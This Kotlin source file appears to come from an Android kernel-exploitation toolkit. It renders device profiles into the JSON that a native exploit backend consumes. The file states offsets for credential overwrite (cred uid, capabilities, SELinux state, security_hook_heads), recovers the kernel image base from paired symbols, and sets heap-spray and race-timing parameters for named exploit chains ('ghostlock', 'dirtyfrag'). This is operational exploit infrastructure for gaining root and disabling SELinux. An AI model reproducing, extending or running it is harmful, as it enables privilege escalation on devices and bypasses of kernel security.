package com.sesame.app.data.profile

import com.sesame.app.data.ValueMap
import com.sesame.app.data.asValueMap
import com.sesame.app.data.getValueAt
import com.sesame.app.data.getLongAt
import com.sesame.app.data.route.RouteKind

/**
 * Renders the resolved (authored-shape) profile as the document the native
 * backend consumes.
 *
 * This is the transport boundary: every backend reads the same document
 * (`profile/json.h` and `profile/json_profile.cpp` on the native side,
 * `timer/profile_fields.c` for the 98260 tool), and each takes the blocks it
 * owns. The mapping below is the single place that turns the authored tree
 * into that shape; the run path, the timer tool and the exporter all go
 * through it.
 *
 * Facts shared between engines are stated once: `kernel.struct.cred` carries
 * the timer's derived overlay (the BTF answer), and `kernel.symbols` carries
 * both the ghostlock offsets and the timer's kernel VAs, converted to
 * image-relative offsets through `kernel.image_base`. The base is recovered
 * from the one symbol the two authored blocks state twice: the timer block's
 * `selinux_state` VA and the ghostlock `offset.selinux_enforcing` are the same
 * symbol exactly `image_base` apart. When that pair is unavailable the base is
 * null, the timer's fake path degrades to its real path (the tool reports the
 * fake constants absent), and the ghostlock facts are unaffected.
 */
object ProfileTransport {
    /** `timer.match_bits`: the site's known low-bit width. */
    const val MatchBits = 21

    private const val Mask21 = (1L shl MatchBits) - 1
    private const val BaseAlignment = 0x200000uL
    private val Syscalls = listOf(
        "select_stack", "sigreturn", "multicast_waiter", "tcp_zerocopy",
    )
    private val TimerKey = "timer_98260"

    /**
     * @param route the picker's syscall; null keeps the first branch.
     * @param carrier the picker's carrier; null keeps the branch's first.
     * @param pipeline the resolved chain for a run ("ghostlock"/"dirtyfrag");
     *   null for previews, the timer tool and the exporter.
     */
    fun render(
        resolved: Map<String, Any?>,
        deviceId: String? = null,
        route: String? = null,
        carrier: String? = null,
        pipeline: String? = null,
        safeMode: Boolean = false,
    ): String {
        val base = imageBase(resolved)
        val branches = branches(resolved)
        val selected = route?.takeIf { it in branches } ?: branches.keys.firstOrNull()
        val document = linkedMapOf<String, Any?>(
            "schema_version" to ProfileResolver.ProfileSchemaVersion.toLong(),
            "release" to resolved["release"],
            "mode" to pipeline,
            "safe_mode" to safeMode,
            "devices" to devices(resolved, deviceId),
            "kernel" to kernel(resolved, base, branches[selected]),
            "ghostlock" to ghostlock(resolved, branches, selected, carrier),
            "timer" to timer(resolved, base),
        )
        return ProfileDocument.renderJson(document)
    }

    // ---- kernel -----------------------------------------------------------

    private fun kernel(
        resolved: Map<String, Any?>,
        base: ULong?,
        selectedBranch: ValueMap?,
    ): Map<String, Any?> {
        val timer = resolved[TimerKey].asValueMap()
        val layout = resolved["waiter_layout"].asValueMap()
        /* One waiter-shape fact. The per-image layout states it when derived;
         * the older 5.10 assets carry only the active branch's
         * `compact_waiter`, which the wire used to read from the branch. */
        val shapeValue = (layout?.get("compact") as? Number)?.toLong()
            ?: (selectedBranch?.get("compact_waiter") as? Number)?.toLong()
        val shape = when (shapeValue) {
            1L -> "compact"
            0L -> "node"
            else -> null
        }
        /* task/lock are shared too; a branch that states them fills a layout
         * the image did not derive (the template case). */
        val taskOffset = (layout?.get("task") as? Number)?.toLong()
            ?: (selectedBranch?.get("task_offset") as? Number)?.toLong()
        val lockOffset = (layout?.get("lock") as? Number)?.toLong()
            ?: (selectedBranch?.get("lock_offset") as? Number)?.toLong()
        val symbols = linkedMapOf<String, Any?>(
            "init_task" to hex(resolved.getLongAt("offset.init_task")),
            "init_cred" to hex(resolved.getLongAt("offset.init_cred")),
            "root_task_group" to hex(resolved.getLongAt("offset.root_task_group")),
            "empty_zero_page" to hex(resolved.getLongAt("offset.empty_zero_page")),
            "selinux_state" to hex(resolved.getLongAt("offset.selinux_enforcing")),
            "selinux_blob_sizes" to hex(resolved.getLongAt("offset.selinux_blob_sizes")),
            "security_hook_heads" to hex(resolved.getLongAt("offset.security_hook_heads")),
            "nf_logger" to hex(resolved.getLongAt("offset.slide_nfulnl_logger")),
            "loggers_0_1" to hex(resolved.getLongAt("offset.slide_loggers_0_1")),
            "boot_id" to hex(resolved.getLongAt("offset.slide_boot_id")),
            "panic_on_warn" to hex(relative(timer, "panic_on_warn", base)),
            "root_user" to hex(relative(timer, "root_user", base)),
            "init_user_ns" to hex(relative(timer, "init_user_ns", base)),
            "init_ucounts" to hex(relative(timer, "init_ucounts", base)),
            "init_groups" to hex(relative(timer, "init_groups", base)),
        )
        val task = linkedMapOf<String, Any?>(
            "prio" to num(resolved, "task_struct.prio"),
            "normal_prio" to num(resolved, "task_struct.normal_prio"),
            "sched_task_group" to num(resolved, "task_struct.sched_task_group"),
            "pi_lock" to num(resolved, "task_struct.pi_lock"),
            "pi_waiters" to num(resolved, "task_struct.pi_waiters"),
            "pi_top_task" to num(resolved, "task_struct.pi_top_task"),
            "pi_blocked_on" to num(resolved, "task_struct.pi_blocked_on"),
            "pid" to num(resolved, "task_struct.pid"),
            "tgid" to num(resolved, "task_struct.tgid"),
            "atomic_flags" to num(resolved, "task_struct.atomic_flags"),
            "real_cred" to num(resolved, "task_struct.real_cred"),
            "cred" to num(resolved, "task_struct.cred"),
            "comm" to num(resolved, "task_struct.comm"),
            "tasks" to num(resolved, "task_struct.tasks"),
            "seccomp" to num(resolved, "task_struct.seccomp"),
        )
        val structure = linkedMapOf<String, Any?>(
            "task" to task,
            "cred" to credential(resolved, timer),
            "waiter" to mapOf(
                "shape" to shape,
                "pi_tree" to num(resolved, "waiter_layout.pi_tree"),
                "task" to taskOffset,
                "lock" to lockOffset,
                "wake_state" to num(resolved, "waiter_layout.wake_state"),
            ),
            "rt_mutex" to mapOf("size" to num(resolved, "kernelsnitch.rt_mutex_size")),
            "selinux_state" to mapOf(
                "enforcing" to num(resolved, "selinux.enforcing"),
                "initialized" to num(resolved, "selinux.initialized"),
            ),
        )
        return linkedMapOf(
            "image_base" to base?.let(::hex),
            "symbols" to symbols,
            "struct" to structure,
            "heap" to mapOf(
                "stride" to num(resolved, "kernelsnitch.mm_struct_sz"),
                "collisions" to num(resolved, "kernelsnitch.collisions"),
            ),
            "dirtyfrag" to dirtyfrag(resolved),
            "kdp" to ((resolved["kdp"] as? Number)?.toLong() == 1L),
        )
    }

    /**
     * The credential layout, deduplicated. The timer block's derived overlay
     * is the BTF answer (decision 16: the 5.15.194 copies disagree and the
     * overlay is adopted), so it wins where it states a field; the ghostlock
     * `cred` block supplies the copy bound, the usage value and the reference
     * images, which the timer does not carry.
     */
    private fun credential(resolved: Map<String, Any?>, timer: ValueMap?): Map<String, Any?> {
        fun overlay(key: String): Long? = (timer?.get(key) as? Number)?.toLong()
        fun ref(overlayKey: String, offsetPath: String, imagePath: String): Map<String, Any?> =
            mapOf(
                "offset" to (overlay(overlayKey) ?: num(resolved, offsetPath)),
                "image" to unsignedHex(resolved.getLongAt(imagePath)),
            )
        return linkedMapOf(
            "copy_size" to num(resolved, "cred.copy_size"),
            "usage" to mapOf(
                "offset" to num(resolved, "cred.usage_offset"),
                "size" to (overlay("cred_usage_size") ?: num(resolved, "cred.usage_size")),
                "value" to num(resolved, "cred.usage_value"),
            ),
            "uid" to (overlay("cred_uid_offset") ?: num(resolved, "cred.uid_offset")),
            "security" to
                (overlay("cred_security_offset") ?: num(resolved, "cred.security_offset")),
            "security_sid" to overlay("security_sid_offset"),
            "caps" to mapOf(
                "offset" to (overlay("cred_caps_offset") ?: num(resolved, "cred.caps_offset")),
                "count" to (overlay("cred_caps_count") ?: num(resolved, "cred.caps_count")),
                "mask" to unsignedHex(resolved.getLongAt("cred.caps_value")),
            ),
            "refs" to mapOf(
                "user" to ref("cred_user_offset", "cred.ref0_offset", "cred.ref0_image"),
                "user_ns" to ref(
                    "cred_user_ns_offset", "cred.ref1_offset", "cred.ref1_image",
                ),
                "ucounts" to ref(
                    "cred_ucounts_offset", "cred.ref2_offset", "cred.ref2_image",
                ),
                "group_info" to ref(
                    "cred_group_info_offset", "cred.ref3_offset", "cred.ref3_image",
                ),
            ),
        )
    }

    private fun dirtyfrag(resolved: Map<String, Any?>): String = when {
        (resolved["kdp"] as? Number)?.toLong() == 1L -> "feasible"
        "dirtyfrag" in ProfileResolver.pipelineOrder(resolved) -> "feasible"
        else -> "unknown"
    }

    // ---- ghostlock --------------------------------------------------------

    private fun ghostlock(
        resolved: Map<String, Any?>,
        branches: Map<String, ValueMap>,
        selected: String?,
        carrier: String?,
    ): Map<String, Any?>? {
        val module = resolved[ModuleBlock.BLOCK_KEY].asValueMap()
        if (branches.isEmpty() && module == null) return null
        val syscalls = linkedMapOf<String, Any?>()
        for (name in Syscalls) {
            syscalls[name] = branches[name]?.let { branchBlocks(name, it) }
        }
        return linkedMapOf(
            "syscall" to selected,
            "carrier" to carrierFor(branches[selected], carrier),
            "anchor" to selected?.let { anchor(branches[it], resolved) },
            "syscalls" to if (branches.isEmpty()) null else syscalls,
            "module" to module?.let {
                mapOf(
                    "asset" to it["asset"],
                    "sha256" to it["asset_sha256"],
                    "vendor_files" to it["vendor_files"],
                )
            },
            "execution" to if (branches.isEmpty()) null else execution(resolved, selected),
        )
    }

    private fun branchBlocks(name: String, branch: ValueMap): Map<String, Any?> {
        val carriers = (branch["carriers"] as? List<*>)
            ?.mapNotNull { (it as? String)?.lowercase() }
        val compatFlag = (branch["compat_carrier"] as? Number)?.toLong() == 1L
        val nativeDeclared = carriers?.contains("native") ?: !compatFlag
        val compatDeclared = carriers?.contains("compat") ?: compatFlag
        fun n(key: String): Long? = (branch[key] as? Number)?.toLong()
        fun abi(): String = if (n("compat_futex_abi") == 1L) "time64" else "time32"
        return when (name) {
            "select_stack" -> mapOf(
                "native" to if (nativeDeclared) {
                    mapOf("waiter_shift" to n("waiter_shift"))
                } else {
                    null
                },
                "compat" to if (compatDeclared) {
                    mapOf(
                        "waiter_home" to n("waiter_home"),
                        "dst_depth" to n("select_dst_depth"),
                        "futex_abi" to abi(),
                    )
                } else {
                    null
                },
            )

            "multicast_waiter" -> mapOf(
                "native" to if (nativeDeclared) {
                    mapOf(
                        "waiter_off" to n("waiter_off"),
                        "buffer_size" to n("buffer_size"),
                    )
                } else {
                    null
                },
                "compat" to if (compatDeclared) {
                    mapOf(
                        "waiter_off" to n("compat_waiter_off"),
                        "buffer_size" to n("compat_buffer_size"),
                        "futex_abi" to abi(),
                    )
                } else {
                    null
                },
            )

            "sigreturn" -> mapOf(
                "native" to mapOf(
                    "waiter_off" to mapOf(
                        "plain" to n("waiter_off_plain"),
                        "sve" to n("waiter_off_sve"),
                    ),
                ),
                "compat" to null,
            )

            else -> mapOf("native" to emptyMap<String, Any?>(), "compat" to null)
        }
    }

    private fun carrierFor(branch: ValueMap?, carrier: String?): String? {
        if (branch == null) return null
        val carriers = (branch["carriers"] as? List<*>)
            ?.mapNotNull { (it as? String)?.lowercase() }
        val compatFlag = (branch["compat_carrier"] as? Number)?.toLong() == 1L
        val nativeDeclared = carriers?.contains("native") ?: !compatFlag
        val compatDeclared = carriers?.contains("compat") ?: compatFlag
        return when {
            /* One carrier: the schema states it (a null would mean native). */
            compatDeclared && !nativeDeclared -> "compat"
            nativeDeclared && !compatDeclared -> null
            nativeDeclared -> carrier?.takeIf { it == "compat" } ?: "native"
            else -> null
        }
    }

    private fun anchor(branch: ValueMap?, resolved: Map<String, Any?>): Map<String, Any?>? {
        val image = unsignedHex((branch?.get("lock_anchor_image") as? Number)?.toLong())
        val bytes = (branch?.get("lock_anchor_bytes") as? Number)?.toLong()
        val stride = (branch?.get("lock_anchor_stride") as? Number)?.toLong()
        val scratch = unsignedHex(resolved.getLongAt("w1_scratch.image"))
        if (image == null && bytes == null && stride == null && scratch == null) return null
        return linkedMapOf(
            "image" to image,
            "bytes" to bytes,
            "stride" to stride,
            "scratch" to scratch,
        )
    }

    /**
     * The native's execution block: the tuning presets plus the selected
     * route's timings, with the consumer cadence hoisted out of the
     * route-scoped preset keys and the CPU pair left for the native's own
     * runtime choice (0/1 is its neutral fallback).
     */
    private fun execution(resolved: Map<String, Any?>, selected: String?): Map<String, Any?> {
        fun value(path: String): Long =
            (resolved.getValueAt("execution.$path") as? Number)?.toLong() ?: 0L
        val routes = resolved.getValueAt("execution.routes").asValueMap()
        fun routeValue(name: String?, key: String): Long? =
            name?.let { routes?.get(it).asValueMap()?.get(key) as? Number }?.toLong()
        val consumerMax = routeValue(selected, "consumer_max_calls")
            ?: routeValue("select_stack", "consumer_max_calls")
            ?: 0L
        val consumerBurst = routeValue(selected, "consumer_burst_calls")
            ?: routeValue("select_stack", "consumer_burst_calls")
            ?: 0L
        val routeBlocks = linkedMapOf<String, Any?>()
        val selectBlock = routes?.get("select_stack").asValueMap()
        routeBlocks["select_stack"] = mapOf<String, Any?>(
            "enter_delay_us" to ((selectBlock?.get("enter_delay_us") as? Number)?.toLong() ?: 0L),
            "timeout_us" to ((selectBlock?.get("timeout_us") as? Number)?.toLong() ?: 0L),
        )
        val tcpBlock = routes?.get("tcp_zerocopy").asValueMap()
        routeBlocks["tcp_zerocopy"] = mapOf<String, Any?>(
            "attempts" to ((tcpBlock?.get("attempts") as? Number)?.toLong() ?: 0L),
            "arm_sequence" to ((tcpBlock?.get("arm_sequence") as? Number)?.toLong() ?: 0L),
            "post_receive_hold_iterations" to
                ((tcpBlock?.get("post_receive_hold_iterations") as? Number)?.toLong() ?: 0L),
        )
        return linkedMapOf(
            "recommended_cpus" to mapOf("main" to 0L, "consumer" to 1L),
            "heap" to mapOf(
                "prepare_max_attempts" to value("heap.prepare_max_attempts"),
                "prepare_timeout_ms" to value("heap.prepare_timeout_ms"),
                "kernelsnitch_timeout_ms" to value("heap.kernelsnitch_timeout_ms"),
            ),
            "race" to mapOf(
                "route_wait_ms" to value("race.route_wait_ms"),
                "route_done_timeout_ms" to value("race.route_done_timeout_ms"),
                "setup_settle_us" to value("race.setup_settle_us"),
                "state_poll_interval_us" to value("race.state_poll_interval_us"),
            ),
            "stages" to mapOf(
                "w1_attempts" to value("stages.w1_attempts"),
                "w1_settle_us" to value("stages.w1_settle_us"),
                "w1_scratch_repair_attempts" to value("stages.w1_scratch_repair_attempts"),
                "w2_attempts" to value("stages.w2_attempts"),
                "w2_settle_us" to value("stages.w2_settle_us"),
                "w3_chain_rounds" to value("stages.w3_chain_rounds"),
                "w3_attempts" to value("stages.w3_attempts"),
                "w3_settle_us" to value("stages.w3_settle_us"),
            ),
            "handoff" to mapOf(
                "pre_dispatch_settle_ms" to value("handoff.pre_dispatch_settle_ms"),
                "module_poll_attempts" to value("handoff.module_poll_attempts"),
                "module_poll_interval_ms" to value("handoff.module_poll_interval_ms"),
                "enforce_poll_attempts" to value("handoff.enforce_poll_attempts"),
                "enforce_poll_interval_ms" to value("handoff.enforce_poll_interval_ms"),
            ),
            "consumer" to mapOf(
                "max_calls" to consumerMax,
                "burst_calls" to consumerBurst,
            ),
            "routes" to routeBlocks,
        )
    }

    // ---- timer ------------------------------------------------------------

    private fun timer(resolved: Map<String, Any?>, base: ULong?): Map<String, Any?>? {
        val timer = resolved[TimerKey].asValueMap() ?: return null
        fun n(key: String): Long? = (timer[key] as? Number)?.toLong()
        val siteVa = unsigned(timer["static_timer_site"])
        /* With the base known the site is stated image-relative, the same way
         * every other offset in the document is. Without it the authored VA is
         * carried through: the tool masks the low bits for its real path and
         * reports the fake constants absent, which is the honest state — it
         * cannot reconstruct the VA. */
        val siteOffset = when {
            siteVa == null -> null
            base != null && siteVa >= base -> (siteVa - base).toLong()
            base == null -> siteVa.toLong()
            else -> null
        }
        val trigger = when (val raw = timer["trigger"]) {
            is String -> raw
            is Number -> if (raw.toLong() == 2L) "core_state" else "killable"
            else -> "killable"
        }
        return linkedMapOf(
            "trigger" to trigger,
            "match_bits" to MatchBits.toLong(),
            "sites" to mapOf(
                "timer" to mapOf("offset" to hex(siteOffset)),
                "task_alloc" to mapOf(
                    "low_bits" to hex(n("task_alloc_site_lower_21bit")?.and(Mask21)),
                ),
            ),
            "object_size" to n("timer_object_size"),
            "task_alloc_size" to n("task_alloc_size"),
            "node_offset" to n("timer_node_offset"),
            "cred" to mapOf(
                "request_size" to n("cred_request_size"),
                "alloc_size" to n("cred_alloc_size"),
            ),
            "trace" to mapOf(
                "gfp" to mapOf(
                    "offset" to n("page_alloc_gfp_offset"),
                    "size" to n("page_alloc_gfp_size"),
                ),
            ),
        )
    }

    // ---- devices ----------------------------------------------------------

    private fun devices(resolved: Map<String, Any?>, deviceId: String?): Map<String, Any?>? {
        val load = resolved.getLongAt("kernel_phys_load")
        val offset = resolved.getLongAt("kernel_phys_offset")
        if (load == null && offset == null) return null
        return mapOf(
            (deviceId ?: "device") to mapOf(
                "phys" to mapOf(
                    "load" to unsignedHex(load),
                    "offset" to unsignedHex(offset),
                ),
            ),
        )
    }

    // ---- helpers ----------------------------------------------------------

    /** The authored route branches, plus a fallback target folded in as one. */
    private fun branches(resolved: Map<String, Any?>): LinkedHashMap<String, ValueMap> {
        val out = LinkedHashMap<String, ValueMap>()
        resolved["route"].asValueMap()?.forEach { (name, value) ->
            value.asValueMap()?.let { out[name] = it }
        }
        val fallback = resolved["fallback"].asValueMap()
        val target = (fallback?.get("to") as? String)?.takeIf { it.isNotEmpty() && it != "none" }
        if (target != null && target !in out) {
            fallback?.get("route").asValueMap()?.get(target).asValueMap()
                ?.let { out[target] = it }
        }
        return out
    }

    /**
     * The image's link base, recovered from the one symbol both authored
     * blocks state (the timer's `selinux_state` VA and the ghostlock
     * `offset.selinux_enforcing`). A base that is not 2 MiB-aligned is not a
     * base and is refused rather than guessed.
     */
    private fun imageBase(resolved: Map<String, Any?>): ULong? {
        val va = unsigned(resolved.getValueAt("$TimerKey.selinux_state")) ?: return null
        val offset = resolved.getLongAt("offset.selinux_enforcing") ?: return null
        val off = offset.toULong()
        if (va <= off) return null
        val base = va - off
        if (base % BaseAlignment != 0uL) return null
        if (base < 0x8000_0000uL) return null
        return base
    }

    /** A timer symbol's image-relative offset from its authored VA. */
    private fun relative(timer: ValueMap?, key: String, base: ULong?): Long? {
        val va = unsigned(timer?.get(key)) ?: return null
        if (base == null || va < base) return null
        val offset = va - base
        return if (offset > Long.MAX_VALUE.toULong()) null else offset.toLong()
    }

    private fun num(resolved: Map<String, Any?>, path: String): Long? =
        resolved.getLongAt(path)

    /** A small non-negative value as the schema's quoted hex string. */
    private fun hex(value: Long?): String? =
        value?.takeIf { it >= 0 }?.toULong()?.let(::hex)

    /** Any 64-bit value (addresses, masks) as the schema's quoted hex string. */
    private fun unsignedHex(value: Long?): String? = value?.toULong()?.let(::hex)

    private fun hex(value: ULong): String = "0x" + value.toString(16)

    private fun unsigned(value: Any?): ULong? = when (value) {
        is String -> value.trim().removePrefix("0x").removePrefix("0X")
            .toULongOrNull(16)

        is Number -> value.toLong().toULong()
        else -> null
    }

    /** The four syscall tokens, for callers that enumerate them. */
    fun syscallTokens(): List<String> = Syscalls.toList()

    /** Whether a rendered document names a syscall the native knows. */
    fun isKnownSyscall(token: String): Boolean = RouteKind.fromToken(token) != null
}
